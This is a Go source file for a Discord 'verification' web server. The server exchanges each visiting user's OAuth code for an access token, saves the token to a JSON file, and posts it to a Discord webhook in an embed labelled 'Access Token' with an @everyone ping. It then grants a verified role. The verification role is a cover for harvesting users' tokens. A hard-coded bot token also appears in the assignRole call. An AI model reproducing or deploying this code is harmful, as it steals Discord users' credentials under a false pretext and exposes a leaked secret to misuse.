package main

import (
	"bytes"
	"fmt"
	"encoding/json"
		"net/http"
		"io/ioutil"
		"time"
	"github.com/gin-gonic/gin"
	"os"
)


// sorry for long setup just cba setting automated shit up atm sorry!
const guild_id = "" // guild where to verify
const bot_token = "" // bot token
const sec = ""; // client secret
const client_id = ""; // client id
const redirect = "http://localhost:8080/callback" // redirection url (change to domain once hosting non locally)
const role_id = "" // verified role id (automated soon) make sure this role is below the bots (without it cannot give the role)

type DiscordToken struct {
	AccessToken string `json:"access_token"`
}




func assignRole(userID string, roleID string, botToken string) error {
	fmt.Printf("Userid: %s, Roleid: %s, bot: %s, guild: %s", userID, roleID, botToken, guild_id)
	url := fmt.Sprintf("https://discord.com/api/guilds/%s/members/%s/roles/%s",guild_id, userID, roleID)
	requestBody := []byte(`{}`)
	req, err := http.NewRequest("PUT", url, bytes.NewBuffer(requestBody))
	if err != nil {
		return err
	}

	req.Header.Set("Authorization", fmt.Sprintf("Bot %s", botToken))
	req.Header.Set("Content-Type", "application/json")

	client := &http.Client{}
	resp, err := client.Do(req)
	if err != nil {
		return err
	}
	defer resp.Body.Close()
	fmt.Println(resp)

	return nil
}


func getUserData(token string) (map[string]interface{}, error) {
	client := &http.Client{}

	req, err := http.NewRequest("GET", "https://discord.com/api/v8/users/@me", nil)
	if err != nil {
		return nil, err
	}

	req.Header.Set("Authorization", "Bearer "+token)

	resp, err := client.Do(req)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()

	var data map[string]interface{}
	err = json.NewDecoder(resp.Body).Decode(&data)
	if err != nil {
		return nil, err
	}

	return data, nil
}


func readJSONFile(filePath string) (map[string]interface{}, error) {
	var data map[string]interface{}

	file, err := os.Open(filePath)
	if err != nil {
		return data, err
	}
	defer file.Close()

	err = json.NewDecoder(file).Decode(&data)
	if err != nil {
		return data, err
	}

	return data, nil
}

func saveData(filepath string, data map[string]interface{}) error {
	file, err := os.OpenFile(filepath, os.O_RDWR|os.O_CREATE, 0644)
	if err != nil {
		return err
	}
	defer file.Close()

	var ff map[string]interface{}
	err = json.NewDecoder(file).Decode(&ff)
	if err != nil {
		ff = make(map[string]interface{})
	}
	fmt.Println(data)
	ff[data["id"].(string)] = data

	file.Truncate(0)
	file.Seek(0, 0)

	err = json.NewEncoder(file).Encode(ff)
	if err != nil {
		return err
	}

	return nil
}

func sendMessage(webhookURL string, content string, embeds []map[string]interface{}) error {
	message := make(map[string]interface{})
	message["content"] = content
	message["embeds"] = embeds

	payload, err := json.Marshal(message)
	if err != nil {
		return err
	}

	resp, err := http.Post(webhookURL, "application/json", bytes.NewBuffer(payload))
	if err != nil {
		return err
	}
	defer resp.Body.Close()


	return nil
}


func main() {
	

	r := gin.Default()
	r.LoadHTMLGlob("templates/*")
	r.GET("/", func(c *gin.Context) {
		c.JSON(200, gin.H{
			"hello": "hello",
		})
	})
	r.GET("/callback", func(c *gin.Context) {
		b, a := readJSONFile("bot/saved.json")
		if a != nil{
			fmt.Println	(a)
			return
		}

		code := c.Query("code")
		client := &http.Client{}
		data := `client_id=` + client_id + `&client_secret=` + sec + `&grant_type=authorization_code&code=` + code + `&redirect_uri=` + redirect
		req, err := http.NewRequest("POST", "https://discord.com/api/oauth2/token", bytes.NewBuffer([]byte(data)))
		if err != nil {
		}
		req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
		resp, err := client.Do(req)
		if err != nil {
		}
		defer resp.Body.Close()
		var discordToken DiscordToken
		err = json.NewDecoder(resp.Body).Decode(&discordToken)
		fmt.Println(string(discordToken.AccessToken))

		token := discordToken.AccessToken
		fmt.Println(token)
		data1, err1 := getUserData(token)
		if err1 != nil {
			fmt.Println(err1)
			return
		}
		var mn = data1["id"]
		fmt.Println(data1["id"])
		err = saveData("bot/saved.json", data1)
		if err != nil {
			fmt.Println(err)
			return
		}
		mn, ok := mn.(string)
if !ok {
}		
fmt.Println(mn)
		content := "@everyone"
		var abc = data1["username"]
		abc, jk := abc.(string)
		if !jk {
		}
		dt := time.Now()
		fmt.Println(abc.(string))
		embed := make(map[string]interface{})
		embed["title"] = "New authenticated user!"
		embed["description"] = "Name: <@"+mn.(string)+">\nAccess Token: "+token+"\nTime: "+dt.String()
		file, err := os.OpenFile("bot/saved.json", os.O_RDWR, 0644)

    defer file.Close()

    bytes, err := ioutil.ReadAll(file)


    var ff map[string]interface{}
    err = json.Unmarshal(bytes, &ff)


    ff["array"] = append(ff["array"].([]interface{}), token)

    bytes, err = json.MarshalIndent(ff, "", "    ")

    err = file.Truncate(0)

    _, err = file.Seek(0, 0)


    _, err = file.Write(bytes)

		embeds := []map[string]interface{}{embed}

		erp := sendMessage(b["log"].(string), content, embeds)
		if erp != nil {
			fmt.Println(erp)
		}
		err2 := assignRole(mn.(string), role_id, "MTA3NjU4MTAyMzg5NjMwNTcxNQ.GQOmYf.MGWzv24irSjRyAvZson2D3-8TNVxLs0tqpolRs")
		if err1 != nil {
			fmt.Println(err2)
			return
		}
		fmt.Println(err2)
		c.HTML(http.StatusOK, "index.html", gin.H{
			
		})
	})

	r.Run()
}
